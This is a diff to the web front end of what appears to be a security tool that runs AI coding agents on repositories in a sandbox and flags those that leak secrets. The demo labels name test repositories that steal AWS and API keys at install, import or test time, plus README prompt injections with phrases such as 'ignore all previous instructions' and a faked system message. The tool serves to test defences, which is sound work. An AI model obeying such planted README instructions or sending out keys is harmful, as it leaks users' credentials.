+  "attacks/install_time_exfil": "Steals the AWS key when installed",
+  "attacks/install_time_exfil_https": "Steals the AWS key when installed (over HTTPS)",
+  "attacks/env_secret_exfil": "Steals API keys from the environment",
+  "attacks/import_time_exfil": "Steals the AWS key when imported",
+  "attacks/test_time_exfil": "Steals the AWS key when its tests run",
+  "attacks/sample_multi": "Hides instructions in base64 and downloads",
+  "attacks/agentdojo/direct": "README asks the AI to send the key",
+  "attacks/agentdojo/ignore_previous": "README: “ignore your instructions”",
+  "attacks/agentdojo/system_message": "README fakes a system message",
+  "attacks/agentdojo/important_instructions": "README: “important instructions”",
+  "attacks/agentdojo/injecagent": "README: “ignore all previous instructions”",
+  "benign/invoice_clean": "A plain invoice library",
+  "benign/multi_module": "A library with many modules",
+  "benign/reads_env": "Reads settings from the environment",
+  "benign/reads_home_config": "Reads its config from your home folder",
+  "benign/contacts_package_index": "Looks up packages on PyPI",
+  "benign/uses_localhost": "Talks to a server on localhost",
+  "benign/security_docs": "Docs that talk about stealing keys",
+  "benign/fetches_exchange_rates": "Calls its own web service",
+};
+const demoLabel = (id) => {
+  if (DEMO_LABELS[id]) return DEMO_LABELS[id];
+  const text = id.replace(/^(attacks|benign)\//, "").replace(/[_/]+/g, " ").trim();
+  return text.charAt(0).toUpperCase() + text.slice(1);
+};
+
+function demoGroup(title, ids) {
+  if (!ids.length) return null;
+  return h("div", { class: "demo-group" }, h("div", { class: "label" }, title),
+    h("div", { class: "demos" }, ids.map((id) =>
+      h("button", { type: "button", class: "demo", title: id, onclick: () => startScan({ demo: id }, demoLabel(id)) }, demoLabel(id)))));
+}
+
+function renderHero() {
+  const box = $("hero-action");
+  clear(box);
   if (!state.live) {
-    card.append(h("h2", {}, "Scan a repository"),
-      h("p", {}, "Live scanning runs on your own machine, because it needs Docker and an API key. To try it:"),
-      h("pre", { class: "cmd" }, "pip install 'agent-trap[web]'\nagenttrap serve"));
+    box.append(h("div", { class: "hero-static" },
+      h("p", {}, "This is a saved copy of the page, so it cannot scan. Live scanning runs on your own machine, because it needs Docker and an API key. To try it, follow the Quick start:"),
+      h("pre", { class: "cmd" }, "git clone https://github.com/p3Xxer/agent-trap\ncd agent-trap && pip install -e .\nagenttrap serve"),
+      h("button", { type: "button", class: "pill", onclick: () => showTab("past") }, "See the saved results")));
     return;
   }
   const input = h("input", { type: "text", id: "url", placeholder: "https://github.com/owner/repo", "aria-label": "GitHub repository URL", autocomplete: "off", spellcheck: "false" });
-  const form = h("form", { onsubmit: (event) => { event.preventDefault(); startScan({ url: input.value }); } },
-    input, h("button", { class: "primary", id: "go", type: "submit" }, "Scan"));
-  card.append(h("h2", {}, "Scan a public GitHub repository"), form,
-    h("p", { class: "muted small" }, `Public repositories only, up to ${state.limits?.max_repo_mb ?? 50} MB. Nothing from the repository runs outside the sandbox. A scan takes a few minutes.`));
-  if (state.demos.length) {
-    card.append(h("div", { class: "muted small", style: "margin-top:12px" }, "Or scan one of our own test repositories:"),
-      h("div", { class: "demos" }, state.demos.map((id) => h("button", { type: "button", class: "demo", onclick: () => startScan({ demo: id }) }, id))));
-  }
+  const quick = (label, color, url) => h("button", { type: "button", class: "pill try-btn",
+    onclick: () => { input.value = url; startScan({ url }); } }, h("span", { style: `color:${color}` }, icon("dot", 12)), label);
+  box.append(
+    h("form", { class: "scan-form", onsubmit: (event) => { event.preventDefault(); startScan({ url: input.value }); } },
+      input, h("button", { class: "primary", id: "go", type: "submit" }, "Scan")),
+    h("div", { class: "try" }, h("span", {}, "Try:"),
+      quick("A repo that steals keys", "#ff6b70", "https://github.com/p3Xxer/malicious-repo-agent-trap"),
+      quick("A safe library", "#4fdc8f", "https://github.com/pallets/markupsafe")),
+    h("p", { class: "helper" }, `Public GitHub repositories up to ${state.limits?.max_repo_mb ?? 50} MB · about 2 minutes · the code only ever runs inside the sandbox`));
+}
+
+function renderDemos() {
+  const box = $("demos");
+  clear(box);
+  if (!state.live || !state.demos.length) return;
+  const attacks = state.demos.filter((d) => d.startsWith("attacks/"));
+  const safe = state.demos.filter((d) => d.startsWith("benign/"));
+  const other = state.demos.filter((d) => !attacks.includes(d) && !safe.includes(d));
+  box.append(h("details", { class: "card demo-box" },
+    h("summary", {}, h("span", { class: "chev", "aria-hidden": "true" }), "More test repositories (run locally)"),
+    h("div", { class: "demo-body" },
+      h("p", { class: "muted small" }, "Our own small repositories, made to attack or to behave. Click one to scan it."),
+      demoGroup("Attacks", attacks), demoGroup("Safe", safe), demoGroup("Other", other))));
 }
 
 function setBusy(busy) {
   state.busy = busy;
-  for (const control of document.querySelectorAll("#go, .demo, #url")) control.disabled = busy;
+  for (const control of document.querySelectorAll("#go, .demo, .try-btn, #url")) control.disabled = busy;
 }
 
-function startScan(body) {
+function scanTitle(body, label) {
+  if (label) return label;
+  const match = /github\.com\/([^/\s]+\/[^/\s#?]+)/i.exec(body.url || "");
+  return match ? match[1].replace(/\.git$/, "") : String(body.url || "").trim() || "repository";
+}
+
+function startElapsed() {
+  clearInterval(state.timer);
+  const began = Date.now(), out = $("elapsed");
+  const tick = () => {
+    const s = Math.floor((Date.now() - began) / 1000);
+    out.textContent = `${Math.floor(s / 60)}:${String(s % 60).padStart(2, "0")} elapsed · usually about 2 minutes`;
+  };
+  tick();
+  state.timer = setInterval(tick, 1000);
+}
+
+function startScan(body, label) {
   if (state.busy) return;
   const log = $("log"), errorBox = $("scan-error");
   clear(log); errorBox.textContent = "";
+  $("progress-title").textContent = `Scanning ${scanTitle(body, label)}…`;
   $("progress").hidden = false;
+  startElapsed();
+  $("progress").scrollIntoView({ block: "nearest", behavior: "smooth" });
   setBusy(true);
   fetch("api/scan", {
     method: "POST",
@@ -365,15 +941,19 @@ function startScan(body) {
     const data = await response.json().catch(() => ({}));
     if (!response.ok) throw new Error(data.error || "The scan could not be started.");
     follow(data.job);
-  }).catch((error) => { errorBox.textContent = error.message; setBusy(false); });
+  }).catch((error) => { errorBox.textContent = error.message; clearInterval(state.timer); setBusy(false); });
 }
 
 function follow(job) {
   const log = $("log"), errorBox = $("scan-error");
   const source = new EventSource(`api/jobs/${encodeURIComponent(job)}/events`);
   let finished = false;
-  const stop = () => { finished = true; source.close(); setBusy(false); };
-  source.addEventListener("progress", (event) => log.append(h("li", {}, JSON.parse(event.data).message)));
+  const settle = () => { for (const old of log.querySelectorAll("li.now")) { old.classList.remove("now"); old.classList.add("past"); } };
+  const stop = () => { finished = true; source.close(); clearInterval(state.timer); setBusy(false); settle(); };
+  source.addEventListener("progress", (event) => {
+    settle();
+    log.append(h("li", { class: "now" }, h("span", { class: "step-dot", "aria-hidden": "true" }), h("span", {}, JSON.parse(event.data).message)));
+  });
   source.addEventListener("error", (event) => {
     if (event.data) { errorBox.textContent = JSON.parse(event.data).message; stop(); }
     else if (!finished) { errorBox.textContent = "Lost the connection to the server."; stop(); }
@@ -385,21 +965,60 @@ function follow(job) {
   });
 }
 
-// ---- start ---------------------------------------------------------------------------------------------------------
+// ---- caught in the wild ------------------------------------------------------------------------
+async function renderWild() {
+  const seen = new Set();
+  const picks = state.results
+    .filter((r) => r.status === "HIJACKED" && String(r.name).startsWith("batch/"))
+    .sort((a, b) => (new Date(b.created).getTime() || 0) - (new Date(a.created).getTime() || 0))
+    .filter((r) => { const n = displayName(r.name); if (seen.has(n)) return false; seen.add(n); return true; })
+    .slice(0, 4);
+  if (!picks.length) return;
+  const docs = await Promise.all(picks.map((r) => getResult(r.id)));
+  const box = $("wild");
+  clear(box);
+  picks.forEach((item, index) => {
+    const g = docs[index] ? leakGroups(docs[index])[0] : null;
+    const host = g && (g.destination_host || g.destination);
+    const text = g && g.secrets && g.secrets.length && host
+      ? `${listOf(g.secrets.map(prettySecret))} → ${host}` : "";
+    box.append(h("button", { type: "button", class: "wild-card", onclick: () => selectResult(item.id) },
+      h("span", { class: "wild-name" }, displayName(item.name)),
+      h("span", { class: "badge HIJACKED" }, LABEL(item.status)),
+      text ? h("p", { class: "small" }, text) : null));
+  });
+  $("wild-box").hidden = false;
+}
+
+// ---- start ---------------------------------------------------------------------------------------------------------------------------
 async function init() {
+  renderStatic();
   const config = await getJson("api/config");
   state.live = !!config?.live;
   state.demos = config?.demos || [];
   state.limits = config?.limits || null;
-  $("mode").textContent = state.live ? "live on this machine" : "saved results only";
-  state.results = (await getJson("api/results")) || (await getJson("results/index.json")) || [];
+  $("mode").textContent = state.live ? "Running on your computer" : "Saved results only";
+  $("mode").classList.toggle("live", state.live);
+  state.results = (await getJson(state.live ? "api/results" : "results/index.json")) || [];
   renderList();
-  renderScanCard();
+  renderHero();
+  renderDemos();
+  renderWild();
+  if (!state.results.length) $("detail").append(h("div", { class: "card muted empty" }, "No past scans to show yet."));
   const wanted = decodeURIComponent(location.hash.slice(1));
-  const first = state.results.find((r) => r.id === wanted) || state.results[0];
-  if (first) await selectResult(first.id);
-  else $("detail").append(h("div", { class: "card muted" }, "Pick a saved result on the left."));
+  const hit = wanted && state.results.find((r) => r.id === wanted);
+  if (hit) await selectResult(hit.id);
+  else if (state.results.length) {
+    // prepare the detail pane so Past scans is useful when opened
+    const first = groupedResults()[0][1][0];
+    const doc = await getResult(first.id);
+    if (doc) { state.current = first.id; renderList(); renderDetail(doc); }
+  }
 }
+window.addEventListener("hashchange", () => {
+  const id = decodeURIComponent(location.hash.slice(1));
+  if (id && id !== state.current && state.results.some((r) => r.id === id)) selectResult(id);
+});
 init();
 </script>
 </body>
